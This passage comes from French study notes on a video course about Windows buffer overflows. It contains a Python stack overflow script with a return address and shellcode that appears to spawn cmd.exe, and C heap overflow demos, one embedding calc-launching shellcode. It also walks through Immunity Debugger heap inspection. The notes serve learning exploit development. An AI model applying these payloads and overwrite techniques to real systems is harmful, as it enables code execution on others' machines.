      <text:p text:style-name="P9">Ce qui nous dit que l'adresse mémoire commençait à l'endroit où on a désormais "cd". On prend une calculatrice hexadécimale, et on entre l'opération :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P17">dd – a1</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17">= 3c</text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T2">= 60 </text:span>(decimal)</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Donc on doit avancer de 60 bytes, et ensuite entrer mon adresse retour pour overwrite cette même adresse.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P12">&gt; Vidéo 0213 :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On essaie maintenant, avec l'information d'au bout de combien de bytes on doit overwrite l'adresse, de créer un petit exploit simple en Python :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P29"><text:span text:style-name="T28">import</text:span> <text:span text:style-name="T24">subprocess</text:span></text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P26">param <text:span text:style-name="T33">=</text:span> <text:span text:style-name="T34">"A"</text:span> <text:span text:style-name="T33">*</text:span> <text:span text:style-name="T33">60</text:span></text:p>
      <text:p text:style-name="P26">ret <text:span text:style-name="T33">=</text:span> <text:span text:style-name="T34">"</text:span><text:span text:style-name="T44">\x5B\x15\x40\x00</text:span><text:span text:style-name="T34">"</text:span></text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26">shellcode <text:span text:style-name="T33">=</text:span> (<text:span text:style-name="T34">"</text:span><text:span text:style-name="T44">\x90</text:span><text:span text:style-name="T34">"</text:span> <text:span text:style-name="T33">*</text:span> <text:span text:style-name="T33">10</text:span> <text:span text:style-name="T33">+</text:span> <text:span text:style-name="T34">"</text:span><text:span text:style-name="T44">\x8b\xec\x55\x8b\xec</text:span><text:span text:style-name="T34">"</text:span> <text:span text:style-name="T33">+</text:span> <text:span text:style-name="T34">"</text:span><text:span text:style-name="T44">\x68\x65\x78\x65\x2F</text:span><text:span text:style-name="T34">"</text:span> <text:span text:style-name="T33">+</text:span> <text:span text:style-name="T34">"</text:span><text:span text:style-name="T44">\x68\x63\x6d\x64\x2e</text:span><text:span text:style-name="T34">"</text:span> <text:span text:style-name="T33">+</text:span> <text:span text:style-name="T34">"</text:span><text:span text:style-name="T44">\x8d\x45\xf8\x50\xb8</text:span><text:span text:style-name="T34">"</text:span> <text:span text:style-name="T33">+</text:span> <text:span text:style-name="T34">"</text:span><text:span text:style-name="T44">\xc7\x93\xc2\x77</text:span><text:span text:style-name="T34">"</text:span> <text:span text:style-name="T33">+</text:span> <text:span text:style-name="T34">"</text:span><text:span text:style-name="T44">\xff\xd0</text:span><text:span text:style-name="T34">"</text:span>)</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P34">subrprocess<text:span text:style-name="T33">.</text:span>call([<text:span text:style-name="T34">"main.exe"</text:span>, param <text:span text:style-name="T33">+</text:span> ret <text:span text:style-name="T33">+</text:span>shellcode])</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:soft-page-break/>Ici la return adress (dans le paramètre '<text:span text:style-name="T2">ret</text:span>') est la véritable return adress du programme, dans Immunity.</text:p>
      <text:p text:style-name="P9">Notons également que notre shellcode commence par une NOP sled de taille 10.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Le problème quand on lance ce code, c'est qu'on a une erreur de Python :</text:p>
      <text:p text:style-name="P17">TypeError: must be string without null bytes or None, not str</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Python n'apprécie pas le '<text:span text:style-name="T2">\x00</text:span>' dans la variable '<text:span text:style-name="T2">ret</text:span>' ; c'est un byte interprêté comme un NULL BYTE. On va apprendre comment contourner ça, mais d'abord testons notre script en remplaçant '<text:span text:style-name="T2">\x00</text:span>' par '<text:span text:style-name="T2">\x11</text:span>'. On fait tourner le script, ce qui fait crasher l'application comme prévu ; mais on a ce message d'erreur :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><draw:frame draw:style-name="fr2" draw:name="images39" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="7.959cm" draw:z-index="38"><draw:image xlink:href="Pictures/2000000700004C62000023C47FBC52B1.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P9">Le programme a bien tenté d'accéder à l'emplacement mémoire <text:span text:style-name="T2">0x1140155b</text:span>, comme on le lui a demandé, on a bien calculé la bonne distance pour injecter notre adresse de retour modifiée.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P12">&gt; Vidéo 0214 :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On enchaîne sur les <text:span text:style-name="T1">heap buffer overflows</text:span>. On va utiliser ce programme (écrit en c) pour démontrer le concept :</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P32">#include &lt;string.h&gt;</text:p>
      <text:p text:style-name="P31">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26"><text:span text:style-name="T36">void</text:span> <text:span text:style-name="T22">main</text:span> (<text:span text:style-name="T36">int</text:span> argc, <text:span text:style-name="T36">char</text:span><text:span text:style-name="T33">*</text:span> argv[])</text:p>
      <text:p text:style-name="P26">{</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/><text:span text:style-name="T36">char</text:span><text:span text:style-name="T33">*</text:span> buff <text:span text:style-name="T33">=</text:span> malloc(<text:span text:style-name="T33">10</text:span>);</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>strcpy(buff,argv[<text:span text:style-name="T33">1</text:span>]);</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/>free(buff);</text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P26"><text:s text:c="8"/><text:span text:style-name="T28">return</text:span> <text:span text:style-name="T33">0</text:span>;</text:p>
      <text:p text:style-name="P34">}</text:p>
      <text:p text:style-name="P9"><text:soft-page-break/></text:p>
      <text:p text:style-name="P9">Comme on l'a vu plus tôt, quand on utilise malloc, on alloue un certain nombre de bytes en mémoire sur le tas (<text:span text:style-name="T1">heap</text:span>). Ce qui est une méthode préférable lorsqu'on veut attribuer des quantités importantes de mémoire.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Ici on demande 10 bytes, puis on copie l'input utilisateur dans ce tableau de 10 bytes. Mais bien sûr, ici si l'input est plus long que 9 caractères, ça va dépasser en mémoire, dans le tas, sur le reste des informations stockées ensuite.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Il faut remarquer que les variables qui sont stockées sur la pile, le sont tant que la fonction qui les appelle est active : quand on arrive à la fin de cette fonction, elles sont automatiquement supprimées. Les variables stockées sur le tas et créée avec malloc sont différentes : on doit explicitement les libérer avec la fonction 'free()'.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">BREF, ici c'était la façon "classique" d'allouer de la mémoire sur le tas. Mais sur Windows, on peut également le faire d'une façon un peu différente, comme illustré par le code suivant :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P32">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P31">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P31">#include &lt;windows.h&gt;<text:tab/><text:span text:style-name="T37">// import windows</text:span></text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26"><text:span text:style-name="T36">int</text:span> <text:span text:style-name="T22">main</text:span>(<text:span text:style-name="T36">int</text:span> argc, <text:span text:style-name="T36">char</text:span> <text:span text:style-name="T33">*</text:span>argv[])</text:p>
      <text:p text:style-name="P26">{</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/><text:span text:style-name="T36">long</text:span><text:span text:style-name="T33">*</text:span> hHeap <text:span text:style-name="T33">=</text:span> HeapCreate(<text:span text:style-name="T33">0x00040000</text:span>, <text:span text:style-name="T33">0</text:span> , <text:span text:style-name="T33">0</text:span>);<text:tab/><text:span text:style-name="T37">// create a heap (windows starts with default heaps, but here we create one</text:span></text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P26"><text:s text:c="2"/><text:span text:style-name="T36">char</text:span> <text:span text:style-name="T33">*</text:span>buff1, <text:span text:style-name="T33">*</text:span>buff2, <text:span text:style-name="T33">*</text:span>buff3;<text:tab/><text:span text:style-name="T37">// define 3 strings pointers</text:span></text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/></text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26"><text:s text:c="2"/>buff1 <text:span text:style-name="T33">=</text:span> HeapAlloc(hHeap, <text:span text:style-name="T33">0</text:span>, <text:span text:style-name="T33">0x10</text:span>);<text:tab/><text:span text:style-name="T37">// allocate 16 bytes (0x10) to buff1</text:span></text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>buff2 <text:span text:style-name="T33">=</text:span> HeapAlloc(hHeap, <text:span text:style-name="T33">0</text:span>, <text:span text:style-name="T33">0x10</text:span>);<text:tab/><text:span text:style-name="T37">// allocate 16 bytes (0x10) to buff2</text:span></text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>HeapFree(hHeap, <text:span text:style-name="T33">0</text:span>, buff2);<text:tab/><text:tab/><text:span text:style-name="T37">// free buff2</text:span></text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/></text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>strcpy(buff1, argv[<text:span text:style-name="T33">1</text:span>]);<text:tab/><text:tab/><text:span text:style-name="T37">// copy user input into buff1</text:span></text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>buff2 <text:span text:style-name="T33">=</text:span> HeapAlloc(hHeap, <text:span text:style-name="T33">0</text:span>, <text:span text:style-name="T33">0x10</text:span>);<text:tab/><text:span text:style-name="T37">// allocate 16 bytes (0x10) to buff2</text:span></text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/></text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>HeapFree(hHeap, <text:span text:style-name="T33">0</text:span>, buff2); <text:span text:style-name="T37">// could seg fault</text:span></text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>HeapFree(hHeap, <text:span text:style-name="T33">0</text:span>, buff1);</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/></text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/><text:span text:style-name="T28">return</text:span> <text:span text:style-name="T33">0</text:span>;</text:p>
      <text:p text:style-name="P34">}</text:p>
      <text:p text:style-name="P28">Apparemment, la segmentation fault arriverait car la variable buff1 pourrait dépasser sur la variable buff2, et effacer un certain nombre de structures utilisées lors de la libération de la mémoire. Voyons ce phénomène plus en détail dans un débugger.</text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P12">&gt; Vidéo 0215 :</text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28">On ouvre notre programme de heap buffer overflow avec Windows (juste ci-dessus donc) dans Immunity Debugger. On définit un breakpoint juste avant l'appel à HeapCreate :</text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28"><draw:frame draw:style-name="fr1" draw:name="images40" text:anchor-type="paragraph" svg:width="19.999cm" svg:height="4.26cm" draw:z-index="39"><draw:image xlink:href="Pictures/20000007000073F7000018B5F3E0B47A.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/></text:p>
      <text:p text:style-name="P28">On copie les arguments de la fonction "HeapCreate" sur la pile (de droite à gauche comme spécifié dans les calling conventions). Puis on a un appel à cette fonction.</text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28">Pour examiner le tas, on entre la commande <text:span text:style-name="T2">!heap</text:span> dans Immunity. Avant l'appel à la fonction HeapCreate, le tas ressemble à ça :</text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28"><draw:frame draw:style-name="fr2" draw:name="images41" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="5.013cm" draw:z-index="40"><draw:image xlink:href="Pictures/2000000700005471000018E9C917BF8E.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P28">On a 2 Heaps, qui sont en réalité des tas par défaut créés par Microsoft. Après l'appel à la fonction HeapCreate, un autre tas est créé :</text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28"><draw:frame draw:style-name="fr3" draw:name="images42" text:anchor-type="paragraph" svg:width="6.191cm" svg:height="1.483cm" draw:z-index="41"><draw:image xlink:href="Pictures/2000000700001830000005CBE9FA3511.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P28">Le tas à l'adresse <text:span text:style-name="T2">0x00bb0000</text:span>. Pour examiner plus en détail ce tas en particulier, on utilise la commande :</text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P30">!heap -h 0x00bb0000</text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28">Et on tombe sur un écran comme celui-ci :</text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28"><draw:frame draw:style-name="fr1" draw:name="images43" text:anchor-type="paragraph" svg:width="18.244cm" svg:height="4.68cm" draw:z-index="42"><draw:image xlink:href="Pictures/200000070000760800001E49984D28B4.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P28"><text:soft-page-break/></text:p>
      <text:p text:style-name="P28">On voit les différents blocs de mémoire alloués sur le tas qu'on a créé avec la fonction HeapAlloc. On voit ici par exemple que le tas créé va de l'adresse <text:span text:style-name="T2">0x007b0000 </text:span>à l'adresse <text:span text:style-name="T2">0x007b0fe0</text:span> (soit un écart de 4064 bytes ; pourquoi 4064 et pas 4000 ? Bonne question).</text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28">On a un premier bloc de mémoire allant de <text:span text:style-name="T2">0x007b0000</text:span> à <text:span text:style-name="T2">0x007b04a8</text:span>, étant donné que la taille du premier bloc (chunk) de mémoire est de <text:span text:style-name="T2">0x000004a8</text:span>. Et ainsi de suite, jusqu'au dernier bloc de mémoire alloué sur ce tas.</text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28">Il faut remarquer que le tas est une "singly linked list" : chaque bloc de mémoire contient un pointeur vers le bloc de mémoire suivant (on ne peut donc traverser la liste que dans un sens, d'un bloc mémoire au suivant). </text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28">Lorsqu'on alloue peu de mémoire (1 kb ou moins, i.e. moins de 1000 bytes) sur le tas, il s'agira d'une "lookaside list", chaque bloc mémoire inclue un pointeur vers le bloc mémoire suivant, mais également un pointeur vers le bloc de mémoire précédent.</text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28">Chaque pointeur requiert 4 bytes de mémoire. Ce qui prendra donc 4 bytes de mémoire dans chaque bloc de mémoire dans le cas des singly linked lists, et 8 bytes dans le cas des lookaside list.</text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28">NOTE : comme prévu, lorsqu'on run ce programme (sans breakpoint) avec en argument moins de 16 caractères, le programme s'exécute comme prévu (exit code 0). Si on le run avec en argument plus de 16 caractères, le programme crash.</text:p>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P12">&gt; Vidéo 0216 :</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P9">Intéressons-nous maintenant à un autre programme pour illustrer les heapbufferoverflows, tel que celui-ci :</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P32">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P31"><text:span text:style-name="T5">#include &lt;stdl</text:span>ib.h&gt;</text:p>
      <text:p text:style-name="P31">#include &lt;windows.h&gt;</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P26"><text:span text:style-name="T36">int</text:span> <text:span text:style-name="T22">main</text:span>(<text:span text:style-name="T36">int</text:span> argc, <text:span text:style-name="T36">char</text:span> <text:span text:style-name="T33">*</text:span>argv[])</text:p>
      <text:p text:style-name="P26">{</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/><text:span text:style-name="T36">long</text:span><text:span text:style-name="T33">*</text:span> hHeap <text:span text:style-name="T33">=</text:span> HeapCreate(<text:span text:style-name="T33">0x00040000</text:span>, <text:span text:style-name="T33">0</text:span> , <text:span text:style-name="T33">0</text:span>);</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/><text:span text:style-name="T36">char</text:span> <text:span text:style-name="T33">*</text:span>buff1, <text:span text:style-name="T33">*</text:span>buff2, <text:span text:style-name="T33">*</text:span>buff3;</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/></text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>buff1 <text:span text:style-name="T33">=</text:span> HeapAlloc(hHeap, <text:span text:style-name="T33">0</text:span>, <text:span text:style-name="T33">0x10</text:span>);</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>buff2 <text:span text:style-name="T33">=</text:span> HeapAlloc(hHeap, <text:span text:style-name="T33">0</text:span>, <text:span text:style-name="T33">0x10</text:span>);</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>HeapFree(hHeap, <text:span text:style-name="T33">0</text:span>, buff2);</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/></text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>strcpy(buff1, <text:span text:style-name="T34">"BBBBBBBBBBBBBBBBAAAABBBB</text:span><text:span text:style-name="T44">\x0a\x40\xab\x71</text:span><text:span text:style-name="T34">"</text:span>);</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>buff2 <text:span text:style-name="T33">=</text:span> HeapAlloc(hHeap, <text:span text:style-name="T33">0</text:span>, <text:span text:style-name="T33">0x10</text:span>);</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>buff3 <text:span text:style-name="T33">=</text:span> HeapAlloc(hHeap, <text:span text:style-name="T33">0</text:span>, <text:span text:style-name="T33">0x10</text:span>);</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>strcpy(buff3, <text:span text:style-name="T34">"</text:span><text:span text:style-name="T44">\x31\xc9\x51\x68\x63\x61\x6c\x63\x54\xb8\xc7\x93\xc2\x77\xff\xd0</text:span><text:span text:style-name="T34">"</text:span>);</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/></text:p>
      <text:p text:style-name="P26"><text:soft-page-break/><text:s text:c="2"/>HeapFree(hHeap, <text:span text:style-name="T33">0</text:span>, buff3);</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>HeapFree(hHeap, <text:span text:style-name="T33">0</text:span>, buff2); </text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>HeapFree(hHeap, <text:span text:style-name="T33">0</text:span>, buff1);</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/></text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/><text:span text:style-name="T28">return</text:span> <text:span text:style-name="T33">0</text:span>;</text:p>
      <text:p text:style-name="P34">}</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Comme dans le programme précédant, on créé un tas. Ensuite on vient définir 3 variables, buff1, buff2 et buff3. Comme avant on alloue 16 bytes à buff1, puis à buff2, avant de libérer buff2.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Ensuite, on vient placer 16 "B" dans buff1. Ce qui remplit entièrement l'espace alloué à buff1. Mais on a vu que dans le cas d'une "lookaside list"<text:note text:id="ftn1" text:note-class="footnote"><text:note-citation>1</text:note-citation><text:note-body><text:p text:style-name="P36"><text:s/>: Mais n'est-on pas normalement dans le cas d'une singly linked list ? Puisqu'on a alloué plus de 1000 bytes ? Ou peut-être qu'il s'agit de la taille allouée <text:span text:style-name="T45">à la variable</text:span><text:span text:style-name="T46"> qui ne doit pas dépasser 1000 bytes pour avoir une lookaside list, ce qui ferait sens.</text:span></text:p></text:note-body></text:note>, on a également 4 bytes dédiés au 'previous pointer', et 4 bytes dédiés au 'next pointer'. On remplit ces 8 bytes avec 4 "A", puis 4 "B". Après ça, on inclut 4 bytes qui forment une adresse mémoire (on verra ensuite pourquoi cette adresse).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Dans cet article, explications détaillées des heap overflows. Je dois encore essayer de le comprendre plus précisément :</text:p>
      <text:p text:style-name="P9"><text:a xlink:type="simple" xlink:href="https://www.fuzzysecurity.com/tutorials/mr_me/2.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.fuzzysecurity.com/tutorials/mr_me/2.html</text:a></text:p>
      <text:p text:style-name="P9"><text:a xlink:type="simple" xlink:href="https://www.fuzzysecurity.com/tutorials/mr_me/3.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.fuzzysecurity.com/tutorials/mr_me/3.html</text:a></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10M48S</meta:editing-duration>
    <meta:editing-cycles>36</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.5$Win32 OpenOffice.org_project/415m1$Build-9789</meta:generator>
    <dc:date>2020-11-03T19:16:28.37</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="43" meta:object-count="0" meta:page-count="27" meta:paragraph-count="379" meta:word-count="6315" meta:character-count="38027"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>